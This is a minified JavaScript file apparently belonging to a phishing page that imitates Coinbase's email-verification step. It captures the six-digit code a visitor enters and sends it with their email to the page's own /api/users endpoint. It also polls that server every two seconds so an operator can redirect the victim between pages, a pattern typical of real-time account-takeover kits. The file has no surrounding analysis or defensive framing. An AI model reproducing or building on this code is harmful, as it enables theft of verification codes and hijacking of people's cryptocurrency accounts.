import"https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js";document.addEventListener("DOMContentLoaded",function(){setInterval(async()=>{try{const t=decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1]||"");if(!t)return;const e=await(await fetch("/api/users?email="+encodeURIComponent(t))).json();e.current_page&&e.current_page!=="email"&&(window.location.href="/"+e.current_page)}catch(t){console.error("Error checking current page:",t)}},2e3);const o=Array.from(document.querySelectorAll(".code-box")),n=document.querySelector(".coinbase-continue-btn"),s=document.querySelector(".resend-link"),i=document.querySelector(".resend-timer");let l=30,f;function u(){const t=o.every(r=>r.value.length===1);n&&(n.disabled=!t)}function m(){s&&s.classList.add("disabled"),i&&(i.textContent=`(${l}s)`),f=window.setInterval(()=>{l--,i&&(i.textContent=`(${l}s)`),l<=0&&(clearInterval(f),s&&s.classList.remove("disabled"),i&&(i.textContent=""),l=30)},1e3)}u(),m(),o.forEach((t,r)=>{t.addEventListener("input",()=>{const e=t.value.replace(/[^0-9]/g,"");t.value=e,e&&r<o.length-1&&o[r+1].focus(),u()}),t.addEventListener("keydown",e=>{e.key==="Backspace"&&!t.value&&r>0&&o[r-1].focus()}),t.addEventListener("paste",e=>{const a=e.clipboardData?.getData("text")||"";/^[0-9]{6}$/.test(a)&&(e.preventDefault(),a.split("").forEach((d,v)=>{o[v]&&(o[v].value=d)}),o[5]&&o[5].focus(),u())})}),s&&s.addEventListener("click",t=>{t.preventDefault(),s.classList.contains("disabled")||(console.log("Resending code..."),m())});const c=document.querySelector(".coinbase-verification-form");c&&c.addEventListener("submit",async t=>{if(t.preventDefault(),!n?.disabled){const r=o.map(e=>e.value).join("");console.log("Submitted code:",r);try{n&&(n.disabled=!0,n.textContent="Verifying...");const e=await fetch("/api/users",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:document.querySelector(".coinbase-email")?.textContent||"",email_code:r,current_page:"wait"})});if(e.ok)window.location.href="/wait";else{const a=await e.json(),d=document.createElement("div");d.className="error-message",d.textContent=a.message||"Verification failed. Please try again.",c.insertBefore(d,c.firstChild),n&&(n.disabled=!1,n.textContent="Continue")}}catch(e){console.error("Error during verification:",e);const a=document.createElement("div");a.className="error-message",a.textContent="Network error. Please try again.",c.insertBefore(a,c.firstChild),n&&(n.disabled=!1,n.textContent="Continue")}}})});
